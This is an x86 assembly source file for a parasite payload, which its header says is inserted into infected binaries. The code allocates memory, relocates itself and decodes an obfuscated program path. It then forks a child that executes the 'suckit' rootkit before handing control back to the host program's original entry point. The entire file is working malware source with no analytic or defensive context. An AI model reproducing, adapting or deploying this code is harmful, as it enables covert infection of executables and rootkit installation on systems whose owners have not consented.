/*
 * $Id: parasite.S, this will be inserted into infected binaries
 */


#include "parasite.h"

/* parasite code */
.data
parasite_start:
	/* get some memory */
	pusha

	xor	%eax, %eax
	push	%eax
	push	%eax
	push	$0x22
	push	$0x7
	push	$4096
	push	%eax

	movb	$90, %al	
	mov	%esp, %ebx
	int	$0x80
	add	$24, %esp

	call	delta
nn:
//	.byte	0xcc
	push	%esi
	mov	%esi, %edi
1:	lodsb
	rolb	$ROLVAL, %al
	stosb
	testb	%al, %al
	jnz	1b
//	int	$3
	
/* fork */
	xor	%eax, %eax
	mov	$190, %al
	
	int	$0x80
	pop	%ebx
	xor	%edx, %edx
	test	%eax, %eax
	jnz	parent
child:
	.byte	0x6a
	.byte	's'
	mov	%esp, %ebp

	push	%eax
	push	%ebp
	push	%ebx
	mov	%esp, %ecx
	mov	$11, %al
	int	$0x80
	push	$1
	pop	%eax
	int	$0x80
	xor	%eax, %eax
	inc	%eax
	xor	%ebx, %ebx
	int	$0x80
	
/* and child executes suckit */
parent:
	/* wait for child to finish */
	xchg	%eax, %ebx
	push	$7
	pop	%eax
	xor	%ecx, %ecx
	int	$0x80

	.byte	0xb9	/* mov ecx */
bss_len:.long	0
	.byte	0xbf	/* mov edi */
bss_addr:.long	0
	xor	%eax, %eax
	repz;	stosb
	popa
	.byte	0x68
orig_ep: .long	0
	ret

/* copy to our new memory and continue from there */
delta:	pop	%esi
	xchg	%eax, %edi
	push	%edi
	mov	$(parasite_end-nn), %ecx
	cld
	repz;	movsb
	ret
parasite_end:
.text
parasite_encode:
	xor	%eax, %eax
	movb	4(%esp), %al
	rorb	$ROLVAL, %al
	ret

.globl	parasite_start
.globl	parasite_end
.globl	parasite_encode
.globl	orig_ep
.globl	bss_addr
.globl	bss_len
